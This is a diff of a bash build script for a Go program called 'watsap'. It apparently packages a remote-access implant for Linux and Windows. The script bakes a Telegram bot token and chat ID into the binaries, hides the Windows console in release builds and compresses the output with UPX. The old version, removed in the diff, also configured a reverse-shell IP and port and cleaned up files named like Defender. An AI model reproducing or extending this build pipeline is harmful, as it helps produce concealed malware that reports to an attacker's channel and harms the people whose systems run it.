@@ -1,150 +1,155 @@
-#!/bin/bash
+#!/usr/bin/env bash
+
 set -euo pipefail
-cd watsap
-clear
+IFS=$'\n\t'
 
-# Function to check if a command is available
-function Test-Bin {
-    local command=$1
-    local installUrl=$2
+# -----------------------------------------------------------------------------
+# Path Resolution
+# -----------------------------------------------------------------------------
+# Get the directory where the script is located
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-    if ! command -v "$command" &>/dev/null; then
-        echo "$command is not installed. Please install it from $installUrl"
-        exit 1
-    fi
+# Detect Project Root (works if script is in root or inside ./scripts/)
+if [[ -d "$SCRIPT_DIR/watsap" ]]; then
+    PROJECT_ROOT="$SCRIPT_DIR"
+elif [[ -d "$SCRIPT_DIR/../watsap" ]]; then
+    PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
+else
+    echo -e "\033[0;31m[ERROR] Could not find 'watsap' source directory. Run this from project root or scripts/ folder.\033[0m"
+    exit 1
+fi
+
+# Define paths
+readonly SOURCE_DIR="$PROJECT_ROOT/watsap"
+readonly DIST_DIR="$PROJECT_ROOT/dist"
+readonly ENV_FILE="$PROJECT_ROOT/.env"
+
+# ANSI Colors
+readonly RED='\033[0;31m'
+readonly GREEN='\033[0;32m'
+readonly YELLOW='\033[1;33m'
+readonly NC='\033[0m' # No Color
+
+# -----------------------------------------------------------------------------
+# Helper Functions
+# -----------------------------------------------------------------------------
+
+log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
+log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
+log_error() { echo -e "${RED}[ERROR]${NC} $1" >&2; }
+
+check_dependencies() {
+    local dependencies=("go" "upx")
+    for cmd in "${dependencies[@]}"; do
+        if ! command -v "$cmd" &> /dev/null; then
+            log_error "Command '$cmd' is missing. Please install it."
+            exit 1
+        fi
+    done
 }
 
-# create .env template
-function Create_env {
-    cat > ../.env <<EOF
-# Set environment variables
+load_env() {
+    if [[ ! -f "$ENV_FILE" ]]; then
+        log_warn ".env file not found at: $ENV_FILE"
+        cat > "$ENV_FILE" <<EOF
 export TG_BOT_TOKEN=""
 export TG_CHAT_ID=""
-export RSHELL_IP=""
-export RSHELL_PORT=""
 EOF
+        log_error "Created template .env. Please fill it and run again."
+        exit 1
+    fi
+
+    # Securely source .env
+    set -a
+    source "$ENV_FILE"
+    set +a
+
+    if [[ -z "${TG_BOT_TOKEN:-}" || -z "${TG_CHAT_ID:-}" ]]; then
+        log_error "TG_BOT_TOKEN or TG_CHAT_ID is missing in .env file."
+        exit 1
+    fi
+    log_info "Environment variables loaded."
 }
 
-# load .env file. create template if not exists
-function Load_env {
-    if [ ! -f ../.env ]; then
-        echo ".env file not found"
-        echo "Creating .env file"
-        echo "Please fill in the required environment variables"
-        Create_env
-        exit 1
+prepare_dirs() {
+    if [[ -d "$DIST_DIR" ]]; then
+        log_info "Cleaning old builds..."
+        rm -f "$DIST_DIR"/watsap-*
     else
-        source ../.env
-        echo "Setting environment variables"
-        echo "---------------------------------------"
-        echo Telegram Bot Token: $TG_BOT_TOKEN
-        echo Telegram Channel ID: $TG_CHAT_ID
-        echo Rshell IP: $RSHELL_IP
-        echo RShell Port: $RSHELL_PORT
-        echo "---------------------------------------"
+        mkdir -p "$DIST_DIR"
     fi
 }
 
-# create output directory
-function Create_output_dir {
-    if [ ! ../dist ]; then
-        mkdir -p ../dist
-    fi
-}
+# -----------------------------------------------------------------------------
+# Main Execution
+# -----------------------------------------------------------------------------
 
-# Genral clean up
-function Clean {
-    rm -f ../dist/watsap-* ../dist/*efender* ../dist/*temp*
-}
+clear
+check_dependencies
+load_env
+prepare_dirs
 
-Clean
+# --- Step 1: Architecture Selection ---
+echo "---------------------------------------"
+echo "Select Target Architecture:"
+echo "1) amd64 (64-bit)"
+echo "2) 386   (32-bit)"
+read -r -p "Choice [1-2]: " arch_choice
 
-echo "Checking required binaries..."
-Test-Bin go "https://golang.org/dl/"
-Test-Bin upx "https://upx.github.io/"
-echo "Loading environment variables..."
-Load_env
-echo "Creating output directory..."
-Create_output_dir
-
-# Common flags for build
-commonFlags="-X 'watsap/utils/config.TG_BOT_TOKEN=$TG_BOT_TOKEN' -X 'watsap/utils/config.TG_CHAT_ID=$TG_CHAT_ID'"
-debugFlags="$commonFlags"
-releaseFlags="$commonFlags -w -s"
-win_releaseFlags="$commonFlags"
-
-# build commands
-build_linux="CGO_ENABLED=0 GOOS=linux go build -ldflags '$releaseFlags' -o ../dist/watsap-linux-amd64.bin ."
-build_windows="CGO_ENABLED=0 GOOS=windows  go build -ldflags '$win_releaseFlags' -o ../dist/watsap-windows-amd64.exe ."
-build_linux_debug="CGO_ENABLED=0 GOOS=linux  go build -ldflags '$debugFlags' -o ../dist/watsap-linux-amd64-debug.bin ."
-build_windows_debug="CGO_ENABLED=0 GOOS=windows  go build -ldflags '$debugFlags' -o ../dist/watsap-windows-amd64-debug.exe ."
-
-# ask for build architecture
-echo "Select build architecture"
-echo "1. amd64"
-echo "2. i386"
-read -p "Enter your choice: " arch
-
-case $arch
-    in
-    1)
-        clear
-        echo "64-bit architecture selected"
-        export GOARCH=amd64
-        ;;
-    2)
-        clear
-        echo "32-bit architecture selected"
-        export GOARCH=386
-        ;;
-    *)
-        echo "Invalid choice"
-        exit 1
-        ;;
+case "$arch_choice" in
+    1) GOARCH="amd64" ;;
+    2) GOARCH="386" ;;
+    *) log_error "Invalid selection."; exit 1 ;;
 esac
 
-# ask user for build type
-echo "Select build type"
-echo "1. Release"
-echo "2. Debug"
-read -p "Enter your choice: " build_type
+# --- Step 2: Build Type Selection ---
+echo "---------------------------------------"
+echo "Select Build Type:"
+echo "1) Release (Optimized, Compressed, Hidden Console on Windows)"
+echo "2) Debug   (Symbols included, Console visible)"
+read -r -p "Choice [1-2]: " build_type
 
-#echo "Build type selected: $build_type"
+# --- Step 3: Compilation ---
 
-case $build_type
-    in
-    1)
-        #clear
-        export CGO_ENABLED=0
-        echo "Building release version"
-        eval $build_linux
-        echo "Built Linux binary"
-        eval $build_windows
-        echo "Built Windows binary"
-        echo "Compressing binaries. This may take a while..."
-        upx -9 -q -f --no-owner ../dist/*.exe ../dist/*.bin > /dev/null
-        echo "Compression completed"
-        ls ../dist/*.exe
-        ls ../dist/*.bin
-        echo "Build complete"
-        ;;
-    2)
-        #clear
-        export CGO_ENABLED=1
-        echo "Building debug version"
-        eval $build_linux_debug
-        echo "Built Linux debug binary"
-        eval $build_windows_debug
-        echo "Built Windows debug binary"
-        echo "Build complete"
-        ls ../dist/*.exe
-        ls ../dist/*.bin
+# Critical: Switch to the source directory containing go.mod
+log_info "Switching to source directory: $SOURCE_DIR"
+cd "$SOURCE_DIR" || exit
 
-        ;;
-    *)
-        echo "Invalid choice"
-        exit 1
-        ;;
-esac
+# Inject environment variables into the binary
+BASE_LDFLAGS="-X 'watsap/utils/config.TG_BOT_TOKEN=$TG_BOT_TOKEN' -X 'watsap/utils/config.TG_CHAT_ID=$TG_CHAT_ID'"
 
-echo "Build script finished."
+if [[ "$build_type" == "1" ]]; then
+    # === RELEASE MODE ===
+    log_info "Building RELEASE version ($GOARCH)..."
+
+    # Linux Build (-s -w strips symbols)
+    CGO_ENABLED=0 GOOS=linux GOARCH="$GOARCH" go build \
+        -ldflags "$BASE_LDFLAGS -s -w" \
+        -o "$DIST_DIR/watsap-linux-$GOARCH.bin" .
+
+    # Windows Build (-H=windowsgui hides console)
+    CGO_ENABLED=0 GOOS=windows GOARCH="$GOARCH" go build \
+        -ldflags "$BASE_LDFLAGS -s -w -H=windowsgui" \
+        -o "$DIST_DIR/watsap-windows-$GOARCH.exe" .
+
+    # Compression
+    log_info "Compressing binaries with UPX..."
+    upx -9 -q -f --no-owner "$DIST_DIR/watsap-windows-$GOARCH.exe" "$DIST_DIR/watsap-linux-$GOARCH.bin" >/dev/null
+
+else
+    # === DEBUG MODE ===
+    log_info "Building DEBUG version ($GOARCH)..."
+
+    CGO_ENABLED=0 GOOS=linux GOARCH="$GOARCH" go build \
+        -ldflags "$BASE_LDFLAGS" \
+        -o "$DIST_DIR/watsap-linux-$GOARCH-debug.bin" .
+
+    CGO_ENABLED=0 GOOS=windows GOARCH="$GOARCH" go build \
+        -ldflags "$BASE_LDFLAGS" \
+        -o "$DIST_DIR/watsap-windows-$GOARCH-debug.exe" .
+fi
+
+# --- Final Report ---
+echo "---------------------------------------"
+log_info "Build finished successfully!"
+ls -lh "$DIST_DIR"
